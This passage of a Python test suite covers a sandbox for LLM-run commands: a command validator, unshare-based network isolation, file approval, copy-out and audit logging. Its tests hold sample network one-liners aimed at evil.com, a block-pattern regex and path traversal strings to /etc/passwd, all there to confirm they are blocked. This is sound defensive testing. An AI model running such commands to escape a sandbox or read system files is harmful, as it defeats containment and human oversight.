    def test_whitespace_only_blocked(self, config):
        """Whitespace-only command is blocked."""
        v = CommandValidator(config)
        safe, _ = v.validate("   ")
        assert safe is False

    def test_rm_relative_allowed(self, config):
        """rm on relative paths (not starting with /) is allowed."""
        v = CommandValidator(config)
        safe, _ = v.validate("rm temp_file.txt")
        assert safe is True


# ---------------------------------------------------------------------------
# Test: Tempdir network isolation via unshare
# ---------------------------------------------------------------------------

class TestTempdirNetworkIsolation:
    """Tests for network isolation in tempdir (degraded) mode.

    Even without bwrap, tempdir mode should use unshare --user --net
    to prevent LLM-created scripts from accessing the network.
    """

    @pytest.fixture
    def config(self, tmp_path):
        return SandboxConfig(
            enabled=True,
            isolation_backend="tempdir",
            require_degraded_confirmation=False,
            workspace_base=str(tmp_path / "sandboxes"),
            audit_db_path=str(tmp_path / "audit.db"),
        )

    @pytest.fixture
    def mgr(self, config):
        m = SandboxManager(config)
        m._degraded_confirmed = True
        yield m
        for sid in list(m._sessions.keys()):
            m.destroy_sandbox(sid)

    def test_unshare_detection(self, mgr):
        """_detect_unshare returns a boolean."""
        result = SandboxManager._detect_unshare()
        assert isinstance(result, bool)

    def test_unshare_available_on_linux(self, mgr):
        """On Linux, unshare should be available."""
        import platform
        if platform.system() != "Linux":
            pytest.skip("Linux only")
        assert SandboxManager._detect_unshare() is True

    def test_build_tempdir_command_with_unshare(self, mgr):
        """When unshare is available, command is wrapped."""
        mgr._unshare_available = True
        parts = mgr._build_tempdir_command("echo hello")
        assert parts[0] == "unshare"
        assert "--user" in parts
        assert "--net" in parts
        assert "echo hello" in parts

    def test_build_tempdir_command_without_unshare(self, mgr):
        """When unshare is not available, plain bash is used."""
        mgr._unshare_available = False
        parts = mgr._build_tempdir_command("echo hello")
        assert parts == ["bash", "-c", "echo hello"]

    def test_unshare_blocks_network(self, mgr):
        """unshare --user --net prevents network access from scripts.

        This tests the real attack vector: LLM creates a script with
        network code, then runs it. The validator cannot catch this
        (it only sees 'python3 script.py'), so unshare must block it.
        """
        import platform
        if platform.system() != "Linux":
            pytest.skip("Linux only")
        if not SandboxManager._detect_unshare():
            pytest.skip("unshare not available")

        session = mgr.create_sandbox("net-test", allow_degraded=True)

        # Step 1: Create a script with network code
        workspace = session.workspace_path
        script = os.path.join(workspace, "net_test.py")
        with open(script, "w") as f:
            f.write(
                "import urllib.request\n"
                "try:\n"
                "    urllib.request.urlopen('http://example.com', timeout=3)\n"
                "    print('NETWORK_OK')\n"
                "except Exception as e:\n"
                "    print(f'NETWORK_BLOCKED: {type(e).__name__}')\n"
            )

        # Step 2: Run the script (validator sees 'python3 net_test.py' — allowed)
        result = mgr.execute_command("net-test", "python3 net_test.py")
        mgr.destroy_sandbox("net-test")

        # Must NOT have network access
        assert "NETWORK_OK" not in result.stdout, (
            "SECURITY FAILURE: script had network access in tempdir mode!"
        )
        assert "NETWORK_BLOCKED" in result.stdout

    def test_lazy_detection(self, mgr):
        """_unshare_available starts as None and is detected on first use."""
        mgr._unshare_available = None
        mgr._build_tempdir_command("echo test")
        assert mgr._unshare_available is not None


class TestCommandValidatorNetworkPatterns:
    """Tests for expanded network blocking patterns."""

    @pytest.fixture
    def config(self, tmp_path):
        return SandboxConfig(
            enabled=True,
            isolation_backend="tempdir",
            workspace_base=str(tmp_path / "sb"),
            audit_db_path=str(tmp_path / "a.db"),
            blocked_patterns=[
                r"python[23]?\s+-c\s+.*\b(os\.|subprocess|socket|"
                r"shutil\.rmtree|urllib|http\.|requests\.|httpx|aiohttp)",
            ],
        )

    def test_python_c_urllib_blocked(self, config):
        """python3 -c with urllib is blocked."""
        v = CommandValidator(config)
        safe, _ = v.validate(
            'python3 -c "import urllib.request; '
            'urllib.request.urlopen(\'http://evil.com\')"'
        )
        assert safe is False

    def test_python_c_http_client_blocked(self, config):
        """python3 -c with http.client is blocked."""
        v = CommandValidator(config)
        safe, _ = v.validate(
            'python3 -c "import http.client; '
            'c=http.client.HTTPConnection(\'evil.com\')"'
        )
        assert safe is False

    def test_python_c_requests_blocked(self, config):
        """python3 -c with requests is blocked."""
        v = CommandValidator(config)
        safe, _ = v.validate(
            'python3 -c "import requests; '
            'requests.get(\'http://evil.com\')"'
        )
        assert safe is False

    def test_python_c_httpx_blocked(self, config):
        """python3 -c with httpx is blocked."""
        v = CommandValidator(config)
        safe, _ = v.validate(
            'python3 -c "import httpx; httpx.get(\'http://evil.com\')"'
        )
        assert safe is False

    def test_python_c_hardcoded_urllib_blocked(self, config):
        """Hardcoded validator catches python -c with urllib."""
        v = CommandValidator(SandboxConfig(
            enabled=True, workspace_base="/tmp/test",
            audit_db_path="/tmp/test.db",
        ))
        safe, reason = v.validate(
            'python3 -c "import urllib.request"'
        )
        assert safe is False
        assert "network module" in reason.lower()

    def test_python_c_hardcoded_ftplib_blocked(self, config):
        """Hardcoded validator catches python -c with ftplib."""
        v = CommandValidator(SandboxConfig(
            enabled=True, workspace_base="/tmp/test",
            audit_db_path="/tmp/test.db",
        ))
        safe, reason = v.validate(
            'python3 -c "import ftplib; ftplib.FTP(\'ftp.evil.com\')"'
        )
        assert safe is False

    def test_python_script_not_blocked(self, config):
        """python3 script.py is NOT blocked by validator (unshare handles it)."""
        v = CommandValidator(config)
        safe, _ = v.validate("python3 my_script.py")
        assert safe is True  # This is handled by unshare network isolation


# ---------------------------------------------------------------------------
# S116: Approval State Machine + Copy-Out Tests
# ---------------------------------------------------------------------------

class TestApprovalState:
    """Tests for the ApprovalState enum (S116)."""

    def test_enum_values(self):
        """ApprovalState has PENDING, APPROVED, REJECTED."""
        assert ApprovalState.PENDING.value == "pending"
        assert ApprovalState.APPROVED.value == "approved"
        assert ApprovalState.REJECTED.value == "rejected"

    def test_enum_members(self):
        """ApprovalState has exactly 3 members."""
        assert len(ApprovalState) == 3


class TestSandboxSessionApproval:
    """Tests for approval fields on SandboxSession (S116)."""

    def test_default_approval_state(self):
        """New session defaults to PENDING."""
        s = SandboxSession(session_id="test", workspace_path="/tmp/x")
        assert s.approval_state == ApprovalState.PENDING
        assert s.approved_paths == set()
        assert s.approved_at is None

    def test_approval_fields_mutable(self):
        """Approval fields can be updated."""
        s = SandboxSession(session_id="test", workspace_path="/tmp/x")
        s.approval_state = ApprovalState.APPROVED
        s.approved_paths.add("foo.txt")
        s.approved_at = 12345.0
        assert s.approval_state == ApprovalState.APPROVED
        assert "foo.txt" in s.approved_paths
        assert s.approved_at == 12345.0


class TestPreviewFile:
    """Tests for preview_file() (S116)."""

    @pytest.fixture
    def mgr(self, tmp_path):
        cfg = SandboxConfig(
            enabled=True,
            isolation_backend="tempdir",
            require_degraded_confirmation=False,
            workspace_base=str(tmp_path),
            audit_db_path="audit_preview.db",
        )
        m = SandboxManager(cfg)
        m.confirm_degraded_mode()
        return m

    def test_preview_text_file(self, mgr):
        """Preview returns text content for UTF-8 files."""
        session = mgr.create_sandbox("prev-1")
        path = os.path.join(session.workspace_path, "hello.txt")
        with open(path, "w") as f:
            f.write("Hello World!")
        result = mgr.preview_file("prev-1", "hello.txt")
        assert result["content"] == "Hello World!"
        assert result["is_binary"] is False
        assert result["size"] == 12
        assert result["truncated"] is False
        mgr.destroy_sandbox("prev-1")

    def test_preview_binary_file(self, mgr):
        """Preview returns hex for binary files."""
        session = mgr.create_sandbox("prev-2")
        path = os.path.join(session.workspace_path, "data.bin")
        with open(path, "wb") as f:
            f.write(bytes(range(256)))
        result = mgr.preview_file("prev-2", "data.bin")
        assert result["is_binary"] is True
        assert len(result["content"]) > 0
        mgr.destroy_sandbox("prev-2")

    def test_preview_truncation(self, mgr):
        """Preview truncates files larger than max_bytes."""
        session = mgr.create_sandbox("prev-3")
        path = os.path.join(session.workspace_path, "large.txt")
        with open(path, "w") as f:
            f.write("A" * 100000)
        result = mgr.preview_file("prev-3", "large.txt", max_bytes=1024)
        assert result["truncated"] is True
        assert len(result["content"]) <= 1024
        mgr.destroy_sandbox("prev-3")

    def test_preview_nonexistent_file(self, mgr):
        """Preview raises ValueError for missing files."""
        mgr.create_sandbox("prev-4")
        with pytest.raises(ValueError, match="not found"):
            mgr.preview_file("prev-4", "ghost.txt")
        mgr.destroy_sandbox("prev-4")

    def test_preview_path_traversal(self, mgr):
        """Preview blocks path traversal attempts."""
        mgr.create_sandbox("prev-5")
        with pytest.raises(ValueError):
            mgr.preview_file("prev-5", "../../../etc/passwd")
        mgr.destroy_sandbox("prev-5")

    def test_preview_invalid_session(self, mgr):
        """Preview raises for unknown session."""
        with pytest.raises(ValueError, match="not found"):
            mgr.preview_file("nonexistent", "file.txt")

    def test_preview_subdirectory(self, mgr):
        """Preview works for files in subdirectories."""
        session = mgr.create_sandbox("prev-6")
        subdir = os.path.join(session.workspace_path, "src")
        os.makedirs(subdir)
        with open(os.path.join(subdir, "main.py"), "w") as f:
            f.write("print('hello')")
        result = mgr.preview_file("prev-6", "src/main.py")
        assert result["content"] == "print('hello')"
        mgr.destroy_sandbox("prev-6")


class TestApproveFiles:
    """Tests for approve_files() and approval state machine (S116)."""

    @pytest.fixture
    def mgr(self, tmp_path):
        cfg = SandboxConfig(
            enabled=True,
            isolation_backend="tempdir",
            require_degraded_confirmation=False,
            workspace_base=str(tmp_path),
            audit_db_path="audit_approve.db",
        )
        m = SandboxManager(cfg)
        m.confirm_degraded_mode()
        return m

    def _create_session_with_files(self, mgr, sid, files):
        """Helper: create sandbox and populate with files."""
        session = mgr.create_sandbox(sid)
        for name, content in files.items():
            path = os.path.join(session.workspace_path, name)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write(content)
        return session

    def test_approve_single_file(self, mgr):
        """Approving a valid file updates state."""
        self._create_session_with_files(mgr, "app-1", {"a.txt": "aaa"})
        approved = mgr.approve_files("app-1", ["a.txt"])
        assert approved == ["a.txt"]
        assert mgr.is_file_approved("app-1", "a.txt")
        info = mgr.get_approval_info("app-1")
        assert info["approval_state"] == "approved"
        mgr.destroy_sandbox("app-1")

    def test_approve_multiple_files(self, mgr):
        """Multiple files can be approved at once."""
        self._create_session_with_files(
            mgr, "app-2", {"a.txt": "a", "b.txt": "b", "c.txt": "c"}
        )
        approved = mgr.approve_files("app-2", ["a.txt", "b.txt"])
        assert set(approved) == {"a.txt", "b.txt"}
        assert not mgr.is_file_approved("app-2", "c.txt")
        mgr.destroy_sandbox("app-2")

    def test_approve_additive(self, mgr):
        """Multiple approve calls are additive."""
        self._create_session_with_files(
            mgr, "app-3", {"a.txt": "a", "b.txt": "b"}
        )
        mgr.approve_files("app-3", ["a.txt"])
        mgr.approve_files("app-3", ["b.txt"])
        assert mgr.is_file_approved("app-3", "a.txt")
        assert mgr.is_file_approved("app-3", "b.txt")
        mgr.destroy_sandbox("app-3")

    def test_approve_nonexistent_file_skipped(self, mgr):
        """Non-existent files are silently skipped."""
        self._create_session_with_files(mgr, "app-4", {"a.txt": "a"})
        approved = mgr.approve_files("app-4", ["a.txt", "ghost.txt"])
        assert approved == ["a.txt"]
        mgr.destroy_sandbox("app-4")

    def test_approve_path_traversal_blocked(self, mgr):
        """Path traversal is blocked during approval."""
        self._create_session_with_files(mgr, "app-5", {"a.txt": "a"})
        approved = mgr.approve_files("app-5", ["../../../etc/passwd"])
        assert approved == []
        mgr.destroy_sandbox("app-5")

    def test_approve_invalid_session(self, mgr):
        """Approve raises for unknown session."""
        with pytest.raises(ValueError, match="not found"):
            mgr.approve_files("nonexistent", ["file.txt"])


class TestRejectFiles:
    """Tests for reject_files() (S116)."""

    @pytest.fixture
    def mgr(self, tmp_path):
        cfg = SandboxConfig(
            enabled=True,
            isolation_backend="tempdir",
            require_degraded_confirmation=False,
            workspace_base=str(tmp_path),
            audit_db_path="audit_reject.db",
        )
        m = SandboxManager(cfg)
        m.confirm_degraded_mode()
        return m

    def test_reject_clears_approvals(self, mgr):
        """Reject clears all approved paths and sets state to rejected."""
        session = mgr.create_sandbox("rej-1")
        with open(os.path.join(session.workspace_path, "a.txt"), "w") as f:
            f.write("aaa")
        mgr.approve_files("rej-1", ["a.txt"])
        assert mgr.is_file_approved("rej-1", "a.txt")

        mgr.reject_files("rej-1")
        assert not mgr.is_file_approved("rej-1", "a.txt")
        info = mgr.get_approval_info("rej-1")
        assert info["approval_state"] == "rejected"
        assert info["approved_paths"] == []
        mgr.destroy_sandbox("rej-1")

    def test_reject_invalid_session(self, mgr):
        """Reject raises for unknown session."""
        with pytest.raises(ValueError, match="not found"):
            mgr.reject_files("nonexistent")


class TestCopyOutFile:
    """Tests for copy_out_file() and copy_out_batch() (S116)."""

    @pytest.fixture
    def mgr(self, tmp_path):
        cfg = SandboxConfig(
            enabled=True,
            isolation_backend="tempdir",
            require_degraded_confirmation=False,
            workspace_base=str(tmp_path / "sandboxes"),
            audit_db_path="audit_copyout.db",
        )
        (tmp_path / "sandboxes").mkdir()
        m = SandboxManager(cfg)
        m.confirm_degraded_mode()
        return m

    @pytest.fixture
    def export_dir(self, tmp_path):
        d = tmp_path / "exports"
        d.mkdir()
        return str(d)

    def _create_session_with_files(self, mgr, sid, files):
        session = mgr.create_sandbox(sid)
        for name, content in files.items():
            path = os.path.join(session.workspace_path, name)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write(content)
        return session

    def test_copy_out_approved_file(self, mgr, export_dir):
        """Approved file copies successfully."""
        self._create_session_with_files(mgr, "co-1", {"a.txt": "content A"})
        mgr.approve_files("co-1", ["a.txt"])
        result = mgr.copy_out_file("co-1", "a.txt", export_dir)
        assert os.path.isfile(result["dest_path"])
        assert result["size"] == 9
        with open(result["dest_path"]) as f:
            assert f.read() == "content A"
        mgr.destroy_sandbox("co-1")

    def test_copy_out_unapproved_file_denied(self, mgr, export_dir):
        """Unapproved file raises PermissionError."""
        self._create_session_with_files(mgr, "co-2", {"a.txt": "content"})
        with pytest.raises(PermissionError, match="not approved"):
            mgr.copy_out_file("co-2", "a.txt", export_dir)
        mgr.destroy_sandbox("co-2")

    def test_copy_out_creates_dest_dir(self, mgr, tmp_path):
        """copy_out_file creates destination directory if missing."""
        self._create_session_with_files(mgr, "co-3", {"a.txt": "data"})
        mgr.approve_files("co-3", ["a.txt"])
        dest = str(tmp_path / "new_dir" / "exports")
        result = mgr.copy_out_file("co-3", "a.txt", dest)
        assert os.path.isfile(result["dest_path"])
        mgr.destroy_sandbox("co-3")

    def test_copy_out_path_traversal_blocked(self, mgr, export_dir):
        """Path traversal in copy_out_file is blocked."""
        self._create_session_with_files(mgr, "co-4", {"a.txt": "data"})
        mgr.approve_files("co-4", ["../../../etc/passwd"])
        # Even if somehow approved (it shouldn't be), source validation blocks
        with pytest.raises((ValueError, PermissionError)):
            mgr.copy_out_file("co-4", "../../../etc/passwd", export_dir)
        mgr.destroy_sandbox("co-4")

    def test_batch_copy_out(self, mgr, export_dir):
        """Batch copies only approved files."""
        self._create_session_with_files(
            mgr, "co-5", {"a.txt": "aaa", "b.txt": "bbb", "c.txt": "ccc"}
        )
        mgr.approve_files("co-5", ["a.txt", "c.txt"])
        results = mgr.copy_out_batch(
            "co-5", ["a.txt", "b.txt", "c.txt"], export_dir
        )
        assert len(results) == 2
        copied_paths = {r["src_path"] for r in results}
        assert copied_paths == {"a.txt", "c.txt"}
        mgr.destroy_sandbox("co-5")

    def test_batch_copy_out_all_unapproved(self, mgr, export_dir):
        """Batch with no approved files returns empty."""
        self._create_session_with_files(mgr, "co-6", {"a.txt": "data"})
        results = mgr.copy_out_batch("co-6", ["a.txt"], export_dir)
        assert len(results) == 0
        mgr.destroy_sandbox("co-6")

    def test_batch_copy_out_invalid_session(self, mgr, export_dir):
        """Batch copy_out with unknown session returns empty (skips all)."""
        results = mgr.copy_out_batch("nonexistent", ["a.txt"], export_dir)
        assert len(results) == 0


class TestApprovalInfo:
    """Tests for get_approval_info() and list_sessions() (S116)."""

    @pytest.fixture
    def mgr(self, tmp_path):
        cfg = SandboxConfig(
            enabled=True,
            isolation_backend="tempdir",
            require_degraded_confirmation=False,
            workspace_base=str(tmp_path),
            audit_db_path="audit_info.db",
        )
        m = SandboxManager(cfg)
        m.confirm_degraded_mode()
        return m

    def test_approval_info_default(self, mgr):
        """New session has pending approval state."""
        mgr.create_sandbox("info-1")
        info = mgr.get_approval_info("info-1")
        assert info["approval_state"] == "pending"
        assert info["approved_paths"] == []
        assert info["approved_at"] is None
        mgr.destroy_sandbox("info-1")

    def test_approval_info_unknown_session(self, mgr):
        """Unknown session returns 'unknown' state."""
        info = mgr.get_approval_info("nonexistent")
        assert info["approval_state"] == "unknown"

    def test_list_sessions_includes_approval(self, mgr):
        """list_sessions() includes approval fields."""
        session = mgr.create_sandbox("info-2")
        with open(os.path.join(session.workspace_path, "f.txt"), "w") as f:
            f.write("x")
        mgr.approve_files("info-2", ["f.txt"])
        sessions = mgr.list_sessions()
        assert len(sessions) == 1
        assert sessions[0]["approval_state"] == "approved"
        assert "f.txt" in sessions[0]["approved_paths"]
        assert sessions[0]["approved_at"] is not None
        mgr.destroy_sandbox("info-2")


class TestApprovalAudit:
    """Tests for approval audit logging (S116)."""

    @pytest.fixture
    def mgr(self, tmp_path):
        cfg = SandboxConfig(
            enabled=True,
            isolation_backend="tempdir",
            require_degraded_confirmation=False,
            workspace_base=str(tmp_path),
            audit_db_path="audit_log_test.db",
        )
        m = SandboxManager(cfg)
        m.confirm_degraded_mode()
        return m

    def test_approve_creates_audit_entry(self, mgr):
        """Approval creates an audit log entry."""
        session = mgr.create_sandbox("aud-1")
        with open(os.path.join(session.workspace_path, "f.txt"), "w") as f:
            f.write("x")
        mgr.approve_files("aud-1", ["f.txt"])
        log = mgr.audit.get_approval_log("aud-1")
        assert len(log) >= 1
        assert log[0]["action"] == "approve"
        mgr.destroy_sandbox("aud-1")

    def test_reject_creates_audit_entry(self, mgr):
        """Rejection creates an audit log entry."""
        mgr.create_sandbox("aud-2")
        mgr.reject_files("aud-2")
        log = mgr.audit.get_approval_log("aud-2")
        assert any(e["action"] == "reject" for e in log)
        mgr.destroy_sandbox("aud-2")

    def test_copy_out_creates_audit_entry(self, mgr, tmp_path):
        """Copy-out creates an audit log entry."""
        session = mgr.create_sandbox("aud-3")
        with open(os.path.join(session.workspace_path, "f.txt"), "w") as f:
            f.write("x")
        mgr.approve_files("aud-3", ["f.txt"])
        dest = str(tmp_path / "exports")
        mgr.copy_out_file("aud-3", "f.txt", dest)
        log = mgr.audit.get_approval_log("aud-3")
        assert any(e["action"] == "copy_out" for e in log)
        mgr.destroy_sandbox("aud-3")

    def test_denied_copy_out_creates_audit_entry(self, mgr, tmp_path):
        """Denied copy-out creates an audit log entry."""
        session = mgr.create_sandbox("aud-4")
        with open(os.path.join(session.workspace_path, "f.txt"), "w") as f:
            f.write("x")
        dest = str(tmp_path / "exports")
        try:
            mgr.copy_out_file("aud-4", "f.txt", dest)
        except PermissionError:
            pass
        log = mgr.audit.get_approval_log("aud-4")
        assert any(e["action"] == "copy_out_denied" for e in log)
        mgr.destroy_sandbox("aud-4")

    def test_destroy_with_approved_creates_audit_entry(self, mgr):
        """Destroying session with approved paths logs it."""
        session = mgr.create_sandbox("aud-5")
        with open(os.path.join(session.workspace_path, "f.txt"), "w") as f:
            f.write("x")
        mgr.approve_files("aud-5", ["f.txt"])
        mgr.destroy_sandbox("aud-5")
        log = mgr.audit.get_approval_log("aud-5")
        assert any(e["action"] == "session_destroyed" for e in log)

    def test_audit_clear_includes_approval_table(self, mgr):
        """AuditLog.clear() clears approval table too."""
        session = mgr.create_sandbox("aud-6")
        with open(os.path.join(session.workspace_path, "f.txt"), "w") as f:
            f.write("x")
        mgr.approve_files("aud-6", ["f.txt"])
        mgr.audit.clear()
        log = mgr.audit.get_approval_log("aud-6")
        assert len(log) == 0
        mgr.destroy_sandbox("aud-6")
